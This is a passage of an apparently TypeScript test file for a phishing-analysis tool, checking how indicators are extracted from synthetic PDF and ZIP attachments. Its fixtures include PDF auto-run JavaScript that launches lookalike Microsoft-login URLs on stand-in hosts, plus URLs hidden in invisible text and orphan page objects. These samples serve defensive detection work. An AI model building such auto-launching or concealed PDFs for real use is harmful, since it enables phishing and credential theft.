        expect([eol, chromium, o.values.includes('https://raw-lure.test/pay')]).toEqual([eol, chromium, true])
      }
    }
  })
})

describe('a case note read for indicators as the analysis read it', () => {
  it('marks a script quoted at 10,000 characters where the cut splits a word, so no host is made of it', async () => {
    const url = 'https://login.microsoftonline.com.evil-host.test/owa'
    const pre = 'var a = 1; '
      .repeat(1000)
      .slice(0, 10_000 - 'var u = "'.length - 'https://login.microsoftonline.co'.length)
    const bytes = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 5, body: '<< /S /JavaScript /JS 6 0 R >>' },
      { num: 6, body: '<< >>', stream: `${pre}var u = "${url}"; app.launchURL(u);`, flate: true }
    ])
    const md = formatPhishReport(await analysePhishing(pdfMail('statement.pdf', bytes), [], []))
    expect(md).toContain('var u = "https://login.microsoftonline.co[…]\n```')
    const { text, left } = noteScanText(md)
    const values = extractIocsFromText(text, []).map((i) => i.value)
    expect(values.filter((v) => /microsoftonline\.co(?!m)/.test(v))).toEqual([])
    expect(left).toBe(1)
  })

  it('takes nothing from invisible text, page objects outside the tree, or the code in a script', async () => {
    const hidden = onePage('BT 3 Tr /F1 12 Tf 72 700 Td (https://hidden-lure.test/y) Tj ET')
    const orphan = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
      { num: 3, body: `<< /Type /Page /Parent 2 0 R /Resources << /Font ${HELVETICA} >> /Contents 4 0 R >>` },
      { num: 4, body: '<< >>', stream: 'BT /F1 12 Tf 72 700 Td (Tree page) Tj ET', flate: true },
      { num: 6, body: `<< /Type /Page /Resources << /Font ${HELVETICA} >> /Contents 7 0 R >>` },
      {
        num: 7,
        body: '<< >>',
        stream: 'BT /F1 12 Tf 72 700 Td (Visit https://orphan-lure.test/x now) Tj ET',
        flate: true
      }
    ])
    const script = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 5, body: '<< /S /JavaScript /JS 6 0 R >>' },
      { num: 6, body: '<< >>', stream: 'var d = this.info; app.launchURL("https://js-only.test/x");', flate: true }
    ])
    const mail = mailWith(
      attached('hidden.pdf', hidden, 'application/pdf'),
      attached('orphan.pdf', orphan, 'application/pdf'),
      attached('form.pdf', script, 'application/pdf')
    )
    const md = formatPhishReport(await analysePhishing(mail, [], []))
    const values = extractIocsFromText(noteScanText(md).text, []).map((i) => i.value)
    expect(values.filter((v) => /hidden-lure|orphan-lure|this\.info/.test(v))).toEqual([])
    // A script's addresses are still read, as the analysis reads them.
    expect(values).toContain('https://js-only.test/x')
  })
})

describe('the raw text scan of a ZIP', () => {
  it('ends a stored entry’s last URL at the next record, not inside its signature', async () => {
    const bytes = zip([{ name: 'readme.txt', data: ascii('see http://zip-readme.test/a') }])
    const report = await analysePhishing(mailWith(attached('docs.zip', bytes, 'application/zip')), [], [])
    expect(report.attachments[0].inside).toContain('url: hxxp://zip-readme[.]test/a')
    expect(report.attachments[0].inside.join('\n')).not.toContain('aPK')
  })
})
